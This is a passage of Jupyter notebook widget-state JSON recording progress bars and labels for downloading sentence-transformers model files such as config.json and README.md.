          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a96ef8a385074304bbec4da2e6b61b39",
            "placeholder": "​",
            "style": "IPY_MODEL_e5d622e1e1354cd89396bbfe3210a3f6",
            "value": "config_sentence_transformers.json: 100%"
          }
        },
        "dc786198a6ce42d7b9e4f367175c771c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7dc0b76926214d4180ebe2e7db394caf",
            "max": 124,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_fa55b6d11ddf4e5482f5a85ad90b11a1",
            "value": 124
          }
        },
        "58f067c4351e41179c6332357612dc3d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_07220c3f8b114ef8bbe2e11436256139",
            "placeholder": "​",
            "style": "IPY_MODEL_a1e79d903b22465cabe65e824d92b892",
            "value": " 124/124 [00:00&lt;00:00, 3.89kB/s]"
          }
        },
        "a3a75168199f4be080003b0b844b1d2d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a96ef8a385074304bbec4da2e6b61b39": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e5d622e1e1354cd89396bbfe3210a3f6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7dc0b76926214d4180ebe2e7db394caf": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fa55b6d11ddf4e5482f5a85ad90b11a1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "07220c3f8b114ef8bbe2e11436256139": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a1e79d903b22465cabe65e824d92b892": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "d9d8b69918cd4f0297944ea8ea0b2946": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_180d8b88bb654439810cbb33fe4dd104",
              "IPY_MODEL_b9dee105f2af47a399a39e80cece4d11",
              "IPY_MODEL_4e94efafcbf74ad08f685c0bf2b3142e"
            ],
            "layout": "IPY_MODEL_9815828d68484592841c4eb2a927a0b5"
          }
        },
        "180d8b88bb654439810cbb33fe4dd104": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5362fabf662a423eb078d8cb6d2ce8c1",
            "placeholder": "​",
            "style": "IPY_MODEL_facc8b4c23ea45108b59b9b041321b8e",
            "value": "README.md: 100%"
          }
        },
        "b9dee105f2af47a399a39e80cece4d11": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_c8c25f340a854a68b2bd0514880bac4c",
            "max": 94551,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_d15ce1ef502b44a2986098ec64792a80",
            "value": 94551
          }
        },
        "4e94efafcbf74ad08f685c0bf2b3142e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a1deeee40bdd405baf588adec30faf8f",
            "placeholder": "​",
            "style": "IPY_MODEL_fcc5c616f0da472280284cb05eaacba6",
            "value": " 94.6k/94.6k [00:00&lt;00:00, 3.07MB/s]"
          }
        },
        "9815828d68484592841c4eb2a927a0b5": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5362fabf662a423eb078d8cb6d2ce8c1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "facc8b4c23ea45108b59b9b041321b8e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "c8c25f340a854a68b2bd0514880bac4c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "d15ce1ef502b44a2986098ec64792a80": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "a1deeee40bdd405baf588adec30faf8f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fcc5c616f0da472280284cb05eaacba6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "92970536beea48caa835f1dfe25be81b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_66f3bc31775d47d99c9f02ab2b7740fb",
              "IPY_MODEL_9f225b2f3438494aabd54d1503bbf683",
              "IPY_MODEL_56f8cedbfb8f4c5391519873fa84ff8b"
            ],
            "layout": "IPY_MODEL_74f2c76e35d2481fa52f0766250fe272"
          }
        },
        "66f3bc31775d47d99c9f02ab2b7740fb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_dde4d262763e4c00ab2b8110d9f1b4b1",
            "placeholder": "​",
            "style": "IPY_MODEL_4c256fbbc43e4f1f9de0cc880c343789",
            "value": "sentence_bert_config.json: 100%"
          }
        },
        "9f225b2f3438494aabd54d1503bbf683": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_abbce8ee7e01441a8e7bc26f29924e00",
            "max": 52,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_0f785530d7b34f94a5d5c4641e13663d",
            "value": 52
          }
        },
        "56f8cedbfb8f4c5391519873fa84ff8b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e69c66f613b841868cca4e25eaa33c37",
            "placeholder": "​",
            "style": "IPY_MODEL_77b0988af1134d0d9d91e7053a71dd9a",
            "value": " 52.0/52.0 [00:00&lt;00:00, 2.48kB/s]"
          }
        },
        "74f2c76e35d2481fa52f0766250fe272": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "dde4d262763e4c00ab2b8110d9f1b4b1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4c256fbbc43e4f1f9de0cc880c343789": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "abbce8ee7e01441a8e7bc26f29924e00": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0f785530d7b34f94a5d5c4641e13663d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "e69c66f613b841868cca4e25eaa33c37": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "77b0988af1134d0d9d91e7053a71dd9a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "68b03f4c4537460d8610680943e9cbd1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_c9a81fff07694e6fb2f60a3ae917f2d8",
              "IPY_MODEL_1ee5aa38178e49339184cd9327e5da95",
              "IPY_MODEL_9d755b37111141a6bf9d348770ad1fd8"
            ],
            "layout": "IPY_MODEL_aab3ec4dd15c40e9b7497289c9a823d5"
          }
        },
        "c9a81fff07694e6fb2f60a3ae917f2d8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_34d92dd1178b4a4389e404c729577d23",
            "placeholder": "​",
            "style": "IPY_MODEL_020fc470782d438d8f9ffba56247773f",
            "value": "config.json: 100%"
          }
        },
        "1ee5aa38178e49339184cd9327e5da95": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7c80b97a9ed44709b16da8fb84fffc53",
            "max": 777,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_877f54140a66466ab5cee9971458c262",
            "value": 777
          }
        },
        "9d755b37111141a6bf9d348770ad1fd8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_3cb21a7c3bca4c8da105033ef5432580",
            "placeholder": "​",
            "style": "IPY_MODEL_9e63621b4eab4bb08603cd647777b07f",
            "value": " 777/777 [00:00&lt;00:00, 10.1kB/s]"
          }
        },
        "aab3ec4dd15c40e9b7497289c9a823d5": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "34d92dd1178b4a4389e404c729577d23": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
